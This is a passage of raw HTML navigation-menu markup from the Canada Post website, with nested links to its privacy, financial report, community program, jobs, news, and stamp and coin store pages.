                        <h3 class="submenu-header">Transparency and trust<span class="open-new-window"></span>
                        </h3>
                        <p>Learn about how we protect your information and keep you informed. </p>
                      </a>
                    </div>
                    <ul>

                      <li>
                        <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/transparency-and-trust/privacy-centre.page?" class="" target="" alt="">Privacy centre</a>
                        <div class="menu-hide level4">
                          <div class="menu-overview">
                            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/transparency-and-trust/privacy-centre.page?" target="" alt="">
                              <h3 class="submenu-header">Privacy centre<span class="open-new-window"></span>
                              </h3>
                              <p>Learn about our privacy practices and access the Privacy Policy.</p>
                            </a>
                          </div>
                          <ul>

                          </ul>
                        </div>
                      </li>

                      <li>
                        <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/transparency-and-trust/access-to-information.page?" class="" target="" alt="">Access to information</a>
                        <div class="menu-hide level4">
                          <div class="menu-overview">
                            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/transparency-and-trust/access-to-information.page?" target="" alt="">
                              <h3 class="submenu-header">Access to information<span class="open-new-window"></span>
                              </h3>
                              <p></p>
                            </a>
                          </div>
                          <ul>

                          </ul>
                        </div>
                      </li>

                    </ul>
                  </div>

                </li>



                <li>
                  <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/legislation-and-regulations.page?" class="menu-title " target="" alt="">Legislation and regulations</a>
                  <div class="menu-hide level1">
                    <div class="menu-overview">
                      <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/legislation-and-regulations.page?" target="" alt="">
                        <h3 class="submenu-header">Legislation and regulations<span class="open-new-window"></span>
                        </h3>
                        <p>Access the Canada Post Corporation Act.</p>
                      </a>
                    </div>
                    <ul>

                    </ul>
                  </div>

                </li>



                <li>
                  <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/financial-reports.page?" class="menu-title parent-link" target="" alt="">Financial reports</a>
                  <div class="menu-item-level level1" data-level="3">
                    <div class="menu-overview">
                      <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/financial-reports.page?" target="" alt="">
                        <h3 class="submenu-header">Financial reports<span class="open-new-window"></span>
                        </h3>
                        <p>View our annual reports and quarterly financial reports.</p>
                      </a>
                    </div>
                    <ul>

                      <li>
                        <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/financial-reports/quarterly-financial-reports.page?" class="" target="" alt="">Quarterly financial reports</a>
                        <div class="menu-hide level4">
                          <div class="menu-overview">
                            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/financial-reports/quarterly-financial-reports.page?" target="" alt="">
                              <h3 class="submenu-header">Quarterly financial reports<span class="open-new-window"></span>
                              </h3>
                              <p>Access current and archived quarterly financial reports.</p>
                            </a>
                          </div>
                          <ul>

                          </ul>
                        </div>
                      </li>

                      <li>
                        <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/financial-reports/2021-annual-report/a-stronger-canada.page?" class="" target="" alt="">2021 Annual report</a>
                        <div class="menu-hide level4">
                          <div class="menu-overview">
                            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/financial-reports/2021-annual-report/a-stronger-canada.page?" target="" alt="">
                              <h3 class="submenu-header">2021 Annual report<span class="open-new-window"></span>
                              </h3>
                              <p>Access the most recent Annual report.</p>
                            </a>
                          </div>
                          <ul>

                          </ul>
                        </div>
                      </li>

                    </ul>
                  </div>

                </li>



                </ul>
              </div>
              </li>

              <li>
                <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/giving-back-to-our-communities.page?" class="parent-link" target="" alt="">Giving back to our communities</a>
                <div class="menu-item-level level1" data-level="2">
                  <div class="menu-overview">
                    <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/giving-back-to-our-communities.page?" target="" alt="">
                      <h3 class="submenu-header">Giving back to our communities<span class="open-new-window"></span>
                      </h3>
                      <p>Learn about grants, awards and access children’s activities.</p>
                    </a>
                  </div>
                  <ul>

                    <li>
                      <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/giving-back-to-our-communities/canada-post-community-foundation.page?" class="menu-title parent-link" target="" alt="">Canada Post Community Foundation</a>
                      <div class="menu-item-level level1" data-level="3">
                        <div class="menu-overview">
                          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/giving-back-to-our-communities/canada-post-community-foundation.page?" target="" alt="">
                            <h3 class="submenu-header">Canada Post Community Foundation<span class="open-new-window"></span>
                            </h3>
                            <p>Learn about Foundation grants for schools, charities and organizations.</p>
                          </a>
                        </div>
                        <ul>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/giving-back-to-our-communities/canada-post-community-foundation/community-foundation-application.page?" class="" target="" alt="">Community Foundation application</a>
                            <div class="menu-hide level4">
                              <div class="menu-overview">
                                <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/giving-back-to-our-communities/canada-post-community-foundation/community-foundation-application.page?" target="" alt="">
                                  <h3 class="submenu-header">Community Foundation application<span class="open-new-window"></span>
                                  </h3>
                                  <p>Learn how to apply for a Community Foundation grant.</p>
                                </a>
                              </div>
                              <ul>

                              </ul>
                            </div>
                          </li>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/giving-back-to-our-communities/canada-post-community-foundation/community-foundation-trustees.page?" class="" target="" alt="">Community Foundation trustees</a>
                            <div class="menu-hide level4">
                              <div class="menu-overview">
                                <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/giving-back-to-our-communities/canada-post-community-foundation/community-foundation-trustees.page?" target="" alt="">
                                  <h3 class="submenu-header">Community Foundation trustees<span class="open-new-window"></span>
                                  </h3>
                                  <p>Learn about the trustees and advisors that award Foundation grants.</p>
                                </a>
                              </div>
                              <ul>

                              </ul>
                            </div>
                          </li>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/giving-back-to-our-communities/canada-post-community-foundation/community-foundation-grant-recipients.page?" class="" target="" alt="">Community Foundation grant recipients</a>
                            <div class="menu-hide level4">
                              <div class="menu-overview">
                                <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/giving-back-to-our-communities/canada-post-community-foundation/community-foundation-grant-recipients.page?" target="" alt="">
                                  <h3 class="submenu-header">Community Foundation grant recipients<span class="open-new-window"></span>
                                  </h3>
                                  <p>Browse past community projects that have received grants.</p>
                                </a>
                              </div>
                              <ul>

                              </ul>
                            </div>
                          </li>

                        </ul>
                      </div>

                    </li>



                    <li>
                      <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/giving-back-to-our-communities/canada-post-awards-for-indigenous-students.page?" class="menu-title parent-link" target="" alt="">Canada Post Awards for Indigenous Students </a>
                      <div class="menu-item-level level1" data-level="3">
                        <div class="menu-overview">
                          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/giving-back-to-our-communities/canada-post-awards-for-indigenous-students.page?" target="" alt="">
                            <h3 class="submenu-header">Canada Post Awards for Indigenous Students <span class="open-new-window"></span>
                            </h3>
                            <p>Learn about education grants for Indigenous Peoples.</p>
                          </a>
                        </div>
                        <ul>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/giving-back-to-our-communities/canada-post-awards-for-indigenous-students/education-award-recipients.page?" class="" target="" alt="">Education award recipients</a>
                            <div class="menu-hide level4">
                              <div class="menu-overview">
                                <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/giving-back-to-our-communities/canada-post-awards-for-indigenous-students/education-award-recipients.page?" target="" alt="">
                                  <h3 class="submenu-header">Education award recipients<span class="open-new-window"></span>
                                  </h3>
                                  <p>Browse a list of past Indigenous Student award winners.</p>
                                </a>
                              </div>
                              <ul>

                              </ul>
                            </div>
                          </li>

                        </ul>
                      </div>

                    </li>



                    <li>
                      <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/giving-back-to-our-communities/write-a-letter-to-santa.page?" class="menu-title parent-link" target="" alt="">Write a letter to Santa</a>
                      <div class="menu-item-level level1" data-level="3">
                        <div class="menu-overview">
                          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/giving-back-to-our-communities/write-a-letter-to-santa.page?" target="" alt="">
                            <h3 class="submenu-header">Write a letter to Santa<span class="open-new-window"></span>
                            </h3>
                            <p>Send a letter to the North Pole and get tips for parents and teachers.</p>
                          </a>
                        </div>
                        <ul>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/giving-back-to-our-communities/write-a-letter-to-santa/santa-program-for-parents.page?" class="" target="" alt="">Santa letter tips for parents</a>
                            <div class="menu-hide level4">
                              <div class="menu-overview">
                                <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/giving-back-to-our-communities/write-a-letter-to-santa/santa-program-for-parents.page?" target="" alt="">
                                  <h3 class="submenu-header">Santa letter tips for parents<span class="open-new-window"></span>
                                  </h3>
                                  <p>Get letter templates and tips for writing to the North Pole.</p>
                                </a>
                              </div>
                              <ul>

                              </ul>
                            </div>
                          </li>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/giving-back-to-our-communities/write-a-letter-to-santa/santa-program-for-teachers.page?" class="" target="" alt="">Santa letter tips for teachers</a>
                            <div class="menu-hide level4">
                              <div class="menu-overview">
                                <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/giving-back-to-our-communities/write-a-letter-to-santa/santa-program-for-teachers.page?" target="" alt="">
                                  <h3 class="submenu-header">Santa letter tips for teachers<span class="open-new-window"></span>
                                  </h3>
                                  <p>Get information on sending a class letter to Santa.</p>
                                </a>
                              </div>
                              <ul>

                              </ul>
                            </div>
                          </li>

                        </ul>
                      </div>

                    </li>



                    <li>
                      <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/giving-back-to-our-communities/kids-postal-service-activities.page?" class="menu-title " target="" alt="">Kids postal service activities</a>
                      <div class="menu-hide level1">
                        <div class="menu-overview">
                          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/giving-back-to-our-communities/kids-postal-service-activities.page?" target="" alt="">
                            <h3 class="submenu-header">Kids postal service activities<span class="open-new-window"></span>
                            </h3>
                            <p>Download printable mail templates and activity sheets.</p>
                          </a>
                        </div>
                        <ul>

                        </ul>
                      </div>

                    </li>



                  </ul>
                </div>
              </li>

              <li>
                <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/jobs.page?" class="parent-link" target="" alt="">Jobs</a>
                <div class="menu-item-level level1" data-level="2">
                  <div class="menu-overview">
                    <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/jobs.page?" target="" alt="">
                      <h3 class="submenu-header">Jobs<span class="open-new-window"></span>
                      </h3>
                      <p>View available job opportunities.</p>
                    </a>
                  </div>
                  <ul>

                    <li>
                      <a href="https://jobs.canadapost.ca/go/Canada-Post-All-Current-Opportunities/2319117/" class="menu-title " target="_blank" alt="Opens in new tab">Apply for current opportunities</a>
                      <div class="menu-hide level1">
                        <div class="menu-overview">
                          <a class="parent-title" href="https://jobs.canadapost.ca/go/Canada-Post-All-Current-Opportunities/2319117/" target="_blank" alt="Opens in new tab">
                            <h3 class="submenu-header">Apply for current opportunities<span class="open-new-window"></span>
                            </h3>
                            <p>Browse available jobs at Canada Post.</p>
                          </a>
                        </div>
                        <ul>

                        </ul>
                      </div>

                    </li>



                  </ul>
                </div>
              </li>

              <li>
                <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/business-opportunities.page?" class="parent-link" target="" alt="">Business opportunities</a>
                <div class="menu-item-level level1" data-level="2">
                  <div class="menu-overview">
                    <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/business-opportunities.page?" target="" alt="">
                      <h3 class="submenu-header">Business opportunities<span class="open-new-window"></span>
                      </h3>
                      <p>Learn about bids for contract work and retail partnerships.</p>
                    </a>
                  </div>
                  <ul>

                    <li>
                      <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/business-opportunities/contracts-for-your-business.page?" class="menu-title parent-link" target="" alt="">Contract work for your business</a>
                      <div class="menu-item-level level1" data-level="3">
                        <div class="menu-overview">
                          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/business-opportunities/contracts-for-your-business.page?" target="" alt="">
                            <h3 class="submenu-header">Contract work for your business<span class="open-new-window"></span>
                            </h3>
                            <p>Partner with us and bid on contracts for your business.</p>
                          </a>
                        </div>
                        <ul>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/business-opportunities/contracts-for-your-business/goods-and-services-contracts.page?" class="" target="" alt="">Goods and services contracts</a>
                            <div class="menu-hide level4">
                              <div class="menu-overview">
                                <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/business-opportunities/contracts-for-your-business/goods-and-services-contracts.page?" target="" alt="">
                                  <h3 class="submenu-header">Goods and services contracts<span class="open-new-window"></span>
                                  </h3>
                                  <p>Browse and bid on goods and services contracts.</p>
                                </a>
                              </div>
                              <ul>

                              </ul>
                            </div>
                          </li>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/business-opportunities/contracts-for-your-business/transportation-contracts.page?" class="" target="" alt="">Transportation contracts</a>
                            <div class="menu-hide level4">
                              <div class="menu-overview">
                                <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/business-opportunities/contracts-for-your-business/transportation-contracts.page?" target="" alt="">
                                  <h3 class="submenu-header">Transportation contracts<span class="open-new-window"></span>
                                  </h3>
                                  <p>Bid on air and ground transportation contracts.</p>
                                </a>
                              </div>
                              <ul>

                              </ul>
                            </div>
                          </li>

                        </ul>
                      </div>

                    </li>



                    <li>
                      <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/business-opportunities/become-an-authorized-retailer.page?" class="menu-title " target="" alt="">Become an authorized retail partner</a>
                      <div class="menu-hide level1">
                        <div class="menu-overview">
                          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/business-opportunities/become-an-authorized-retailer.page?" target="" alt="">
                            <h3 class="submenu-header">Become an authorized retail partner<span class="open-new-window"></span>
                            </h3>
                            <p>Offer post office products and services from your business.</p>
                          </a>
                        </div>
                        <ul>

                        </ul>
                      </div>

                    </li>



                  </ul>
                </div>
              </li>

              <li>
                <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media.page?" class="parent-link" target="" alt="">News and media</a>
                <div class="menu-item-level level1" data-level="2">
                  <div class="menu-overview">
                    <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media.page?" target="" alt="">
                      <h3 class="submenu-header">News and media<span class="open-new-window"></span>
                      </h3>
                      <p>Access mailing service updates and images for media.</p>
                    </a>
                  </div>
                  <ul>

                    <li>
                      <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/service-alerts.page?" class="menu-title parent-link" target="" alt="">Service alerts</a>
                      <div class="menu-item-level level1" data-level="3">
                        <div class="menu-overview">
                          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/service-alerts.page?" target="" alt="">
                            <h3 class="submenu-header">Service alerts<span class="open-new-window"></span>
                            </h3>
                            <p>Updated details on mail delivery interruptions.</p>
                          </a>
                        </div>
                        <ul>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/service-alerts/service-alerts-archive.page?" class="" target="" alt="">Service alerts archive </a>
                            <div class="menu-hide level4">
                              <div class="menu-overview">
                                <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/service-alerts/service-alerts-archive.page?" target="" alt="">
                                  <h3 class="submenu-header">Service alerts archive <span class="open-new-window"></span>
                                  </h3>
                                  <p>Browse past service alerts.</p>
                                </a>
                              </div>
                              <ul>

                              </ul>
                            </div>
                          </li>

                        </ul>
                      </div>

                    </li>



                    <li>
                      <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/corporate-news.page?" class="menu-title parent-link" target="" alt="">Corporate news</a>
                      <div class="menu-item-level level1" data-level="3">
                        <div class="menu-overview">
                          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/corporate-news.page?" target="" alt="">
                            <h3 class="submenu-header">Corporate news<span class="open-new-window"></span>
                            </h3>
                            <p>Access news releases and company updates.</p>
                          </a>
                        </div>
                        <ul>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/corporate-news/news-release-list.page?" class="" target="" alt="">News releases</a>
                            <div class="menu-hide level4">
                              <div class="menu-overview">
                                <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/corporate-news/news-release-list.page?" target="" alt="">
                                  <h3 class="submenu-header">News releases<span class="open-new-window"></span>
                                  </h3>
                                  <p>Browse our most recent and past news releases.</p>
                                </a>
                              </div>
                              <ul>

                              </ul>
                            </div>
                          </li>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/corporate-news/closures-and-service-interruptions-list.page?" class="" target="" alt="">Closures and service interruptions</a>
                            <div class="menu-hide level4">
                              <div class="menu-overview">
                                <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/corporate-news/closures-and-service-interruptions-list.page?" target="" alt="">
                                  <h3 class="submenu-header">Closures and service interruptions<span class="open-new-window"></span>
                                  </h3>
                                  <p>Learn about weather events and holiday hours impacting delivery.</p>
                                </a>
                              </div>
                              <ul>

                              </ul>
                            </div>
                          </li>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/corporate-news/negotiations-list.page?" class="" target="" alt="">Negotiations updates</a>
                            <div class="menu-hide level4">
                              <div class="menu-overview">
                                <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/corporate-news/negotiations-list.page?" target="" alt="">
                                  <h3 class="submenu-header">Negotiations updates<span class="open-new-window"></span>
                                  </h3>
                                  <p>Get information on negotiations with our unions.</p>
                                </a>
                              </div>
                              <ul>

                              </ul>
                            </div>
                          </li>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/corporate-news/coronavirus-disease-covid-19.page?" class="parent-link" target="" alt="">COVID-19 updates</a>
                            <div class="menu-item-level level4" data-level="4">
                              <div class="menu-overview">
                                <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/corporate-news/coronavirus-disease-covid-19.page?" target="" alt="">
                                  <h3 class="submenu-header">COVID-19 updates<span class="open-new-window"></span>
                                  </h3>
                                  <p>Learn about impacts to sending amid COVID-19.</p>
                                </a>
                              </div>
                              <ul>

                                <li>
                                  <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/corporate-news/coronavirus-disease-covid-19/coronavirus-disease-covid-19-faq.page?" class="" target="" alt="">COVID-19 frequently asked questions </a>
                                  <div class="menu-hide level4">
                                    <div class="menu-overview">
                                      <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/corporate-news/coronavirus-disease-covid-19/coronavirus-disease-covid-19-faq.page?" target="" alt="">
                                        <h3 class="submenu-header">COVID-19 frequently asked questions <span class="open-new-window"></span>
                                        </h3>
                                        <p></p>
                                      </a>
                                    </div>
                                    <ul>

                                    </ul>
                                  </div>
                                </li>

                              </ul>
                            </div>
                          </li>

                        </ul>
                      </div>

                    </li>



                    <li>
                      <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/media-centre.page?" class="menu-title parent-link" target="" alt="">Media centre</a>
                      <div class="menu-item-level level1" data-level="3">
                        <div class="menu-overview">
                          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/media-centre.page?" target="" alt="">
                            <h3 class="submenu-header">Media centre<span class="open-new-window"></span>
                            </h3>
                            <p>Access official company images, logos and videos.</p>
                          </a>
                        </div>
                        <ul>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/media-centre/photo-gallery.page?" class="" target="" alt="">Photo gallery</a>
                            <div class="menu-hide level4">
                              <div class="menu-overview">
                                <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/media-centre/photo-gallery.page?" target="" alt="">
                                  <h3 class="submenu-header">Photo gallery<span class="open-new-window"></span>
                                  </h3>
                                  <p>Browse and download official company images.</p>
                                </a>
                              </div>
                              <ul>

                              </ul>
                            </div>
                          </li>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/media-centre/b-roll-footage.page?" class="" target="" alt="">B-roll footage</a>
                            <div class="menu-hide level4">
                              <div class="menu-overview">
                                <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/media-centre/b-roll-footage.page?" target="" alt="">
                                  <h3 class="submenu-header">B-roll footage<span class="open-new-window"></span>
                                  </h3>
                                  <p>View and download B-roll footage of our facilities and products.</p>
                                </a>
                              </div>
                              <ul>

                              </ul>
                            </div>
                          </li>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/media-centre/canada-post-logos.page?" class="" target="" alt="">Canada Post logos</a>
                            <div class="menu-hide level4">
                              <div class="menu-overview">
                                <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/media-centre/canada-post-logos.page?" target="" alt="">
                                  <h3 class="submenu-header">Canada Post logos<span class="open-new-window"></span>
                                  </h3>
                                  <p>Access our company logo and guidelines on how it should be applied.</p>
                                </a>
                              </div>
                              <ul>

                              </ul>
                            </div>
                          </li>

                        </ul>
                      </div>

                    </li>



                  </ul>
                </div>
              </li>


              </ul>
              <ul id="mobile-nav-section-shop" class="menu-primary-links " data-sitemap="shop">

                <div class="menu-overview">
                  <a class="parent-title" href="https://store.canadapost-postescanada.ca/store-boutique/en/home" target="">
                    <h3 class="submenu-header">Store<span class="open-new-window"></span>
                    </h3>
                    <p>Shop for stamps, shipping supplies and collectibles.</p>
                  </a>
                </div>

                <li>
                  <a href="https://store.canadapost-postescanada.ca/store-boutique/en/1/c/mailing-and-shipping" class="parent-link" target="" alt="">Mailing and shipping</a>
                  <div class="menu-item-level level1" data-level="2">
                    <div class="menu-overview">
                      <a class="parent-title" href="https://store.canadapost-postescanada.ca/store-boutique/en/1/c/mailing-and-shipping" target="" alt="">
                        <h3 class="submenu-header">Mailing and shipping<span class="open-new-window"></span>
                        </h3>
                        <p>Order packaging, envelopes, stamps, boxes and wraps.</p>
                      </a>
                    </div>
                    <ul>

                      <li>
                        <a href="https://store.canadapost-postescanada.ca/store-boutique/en/5/c/postage-stamps" class="menu-title " target="" alt="">Postage stamps</a>
                        <div class="menu-hide level1">
                          <div class="menu-overview">
                            <a class="parent-title" href="https://store.canadapost-postescanada.ca/store-boutique/en/5/c/postage-stamps" target="" alt="">
                              <h3 class="submenu-header">Postage stamps<span class="open-new-window"></span>
                              </h3>
                              <p></p>
                            </a>
                          </div>
                          <ul>

                          </ul>
                        </div>

                      </li>



                      <li>
                        <a href="https://store.canadapost-postescanada.ca/store-boutique/en/8/c/flat-rate-prepaid-products" class="menu-title parent-link" target="" alt="">Flat rate (prepaid) products</a>
                        <div class="menu-item-level level1" data-level="3">
                          <div class="menu-overview">
                            <a class="parent-title" href="https://store.canadapost-postescanada.ca/store-boutique/en/8/c/flat-rate-prepaid-products" target="" alt="">
                              <h3 class="submenu-header">Flat rate (prepaid) products<span class="open-new-window"></span>
                              </h3>
                              <p>Discover prepaid envelopes and flat rate boxes, priced by region.</p>
                            </a>
                          </div>
                          <ul>

                            <li>
                              <a href="https://store.canadapost-postescanada.ca/store-boutique/en/38/c/flat-rate-prepaid-products-and-shipping-regions" class="" target="" alt="">Flat rate (prepaid) products and shipping regions</a>
                              <div class="menu-hide level4">
                                <div class="menu-overview">
                                  <a class="parent-title" href="https://store.canadapost-postescanada.ca/store-boutique/en/38/c/flat-rate-prepaid-products-and-shipping-regions" target="" alt="">
                                    <h3 class="submenu-header">Flat rate (prepaid) products and shipping regions<span class="open-new-window"></span>
                                    </h3>
                                    <p></p>
                                  </a>
                                </div>
                                <ul>

                                </ul>
                              </div>
                            </li>

                          </ul>
                        </div>

                      </li>



                      <li>
                        <a href="https://store.canadapost-postescanada.ca/store-boutique/en/7/c/shipping-supplies" class="menu-title " target="" alt="">Shipping supplies</a>
                        <div class="menu-hide level1">
                          <div class="menu-overview">
                            <a class="parent-title" href="https://store.canadapost-postescanada.ca/store-boutique/en/7/c/shipping-supplies" target="" alt="">
                              <h3 class="submenu-header">Shipping supplies<span class="open-new-window"></span>
                              </h3>
                              <p></p>
                            </a>
                          </div>
                          <ul>

                          </ul>
                        </div>

                      </li>



                    </ul>
                  </div>
                </li>

                <li>
                  <a href="https://store.canadapost-postescanada.ca/store-boutique/en/2/c/stamp-collecting" class="parent-link" target="" alt="">Stamp collecting</a>
                  <div class="menu-item-level level1" data-level="2">
                    <div class="menu-overview">
                      <a class="parent-title" href="https://store.canadapost-postescanada.ca/store-boutique/en/2/c/stamp-collecting" target="" alt="">
                        <h3 class="submenu-header">Stamp collecting<span class="open-new-window"></span>
                        </h3>
                        <p>See the latest stamp collections and quality accessories.</p>
                      </a>
                    </div>
                    <ul>

                      <li>
                        <a href="https://store.canadapost-postescanada.ca/store-boutique/en/10/c/stamps-and-collectibles" class="menu-title " target="" alt="">Stamps and collectibles</a>
                        <div class="menu-hide level1">
                          <div class="menu-overview">
                            <a class="parent-title" href="https://store.canadapost-postescanada.ca/store-boutique/en/10/c/stamps-and-collectibles" target="" alt="">
                              <h3 class="submenu-header">Stamps and collectibles<span class="open-new-window"></span>
                              </h3>
                              <p></p>
                            </a>
                          </div>
                          <ul>

                          </ul>
                        </div>

                      </li>



                      <li>
                        <a href="https://store.canadapost-postescanada.ca/store-boutique/en/13/c/stamp-collecting-accessories" class="menu-title " target="" alt="">Stamp collecting accessories</a>
                        <div class="menu-hide level1">
                          <div class="menu-overview">
                            <a class="parent-title" href="https://store.canadapost-postescanada.ca/store-boutique/en/13/c/stamp-collecting-accessories" target="" alt="">
                              <h3 class="submenu-header">Stamp collecting accessories<span class="open-new-window"></span>
                              </h3>
                              <p></p>
                            </a>
                          </div>
                          <ul>

                          </ul>
                        </div>

                      </li>



                      <li>
                        <a href="https://store.canadapost-postescanada.ca/store-boutique/en/14/c/postcards" class="menu-title " target="" alt="">Postcards</a>
                        <div class="menu-hide level1">
                          <div class="menu-overview">
                            <a class="parent-title" href="https://store.canadapost-postescanada.ca/store-boutique/en/14/c/postcards" target="" alt="">
                              <h3 class="submenu-header">Postcards<span class="open-new-window"></span>
                              </h3>
                              <p></p>
                            </a>
                          </div>
                          <ul>

                          </ul>
                        </div>

                      </li>



                    </ul>
                  </div>
                </li>

                <li>
                  <a href="https://store.canadapost-postescanada.ca/store-boutique/en/3/c/coin-collecting" class="parent-link" target="" alt="">Coin collecting</a>
                  <div class="menu-item-level level1" data-level="2">
                    <div class="menu-overview">
                      <a class="parent-title" href="https://store.canadapost-postescanada.ca/store-boutique/en/3/c/coin-collecting" target="" alt="">
                        <h3 class="submenu-header">Coin collecting<span class="open-new-window"></span>
                        </h3>
                        <p>View featured collectible coins released by the Canadian Mint.</p>
                      </a>
                    </div>
                    <ul>

                      <li>
                        <a href="https://store.canadapost-postescanada.ca/store-boutique/en/15/c/new-arrivals" class="menu-title " target="" alt="">New arrivals</a>
                        <div class="menu-hide level1">
                          <div class="menu-overview">
                            <a class="parent-title" href="https://store.canadapost-postescanada.ca/store-boutique/en/15/c/new-arrivals" target="" alt="">
                              <h3 class="submenu-header">New arrivals<span class="open-new-window"></span>
                              </h3>
                              <p></p>
                            </a>
                          </div>
                          <ul>

                          </ul>
                        </div>

                      </li>



                      <li>
                        <a href="https://store.canadapost-postescanada.ca/store-boutique/en/16/c/coins-and-collectables" class="menu-title " target="" alt="">Coins and coin sets</a>
                        <div class="menu-hide level1">
                          <div class="menu-overview">
                            <a class="parent-title" href="https://store.canadapost-postescanada.ca/store-boutique/en/16/c/coins-and-collectables" target="" alt="">
                              <h3 class="submenu-header">Coins and coin sets<span class="open-new-window"></span>
                              </h3>
                              <p></p>
                            </a>
                          </div>
                          <ul>

                          </ul>
                        </div>

                      </li>



                      <li>
                        <a href="https://store.canadapost-postescanada.ca/store-boutique/en/17/c/coin-collecting-accessories" class="menu-title " target="" alt="">Coin albums and accessories</a>
                        <div class="menu-hide level1">
                          <div class="menu-overview">
                            <a class="parent-title" href="https://store.canadapost-postescanada.ca/store-boutique/en/17/c/coin-collecting-accessories" target="" alt="">
                              <h3 class="submenu-header">Coin albums and accessories<span class="open-new-window"></span>
                              </h3>
                              <p></p>
                            </a>
                          </div>
                          <ul>

                          </ul>
                        </div>

                      </li>



                    </ul>
                  </div>
                </li>

                <li>
                  <a href="https://store.canadapost-postescanada.ca/quick-order" class="" target="" alt="">Quick Order</a>
                  <div class="menu-hide level1">
                    <div class="menu-overview">
                      <a class="parent-title" href="https://store.canadapost-postescanada.ca/quick-order" target="" alt="">
                        <h3 class="submenu-header">Quick Order<span class="open-new-window"></span>
                        </h3>
                        <p></p>
                      </a>
                    </div>
                    <ul>

                    </ul>
                  </div>
                </li>

                <li>
                  <a href="https://store.canadapost-postescanada.ca/favourites" class="" target="" alt="">Favourites</a>
                  <div class="menu-hide level1">
                    <div class="menu-overview">
                      <a class="parent-title" href="https://store.canadapost-postescanada.ca/favourites" target="" alt="">
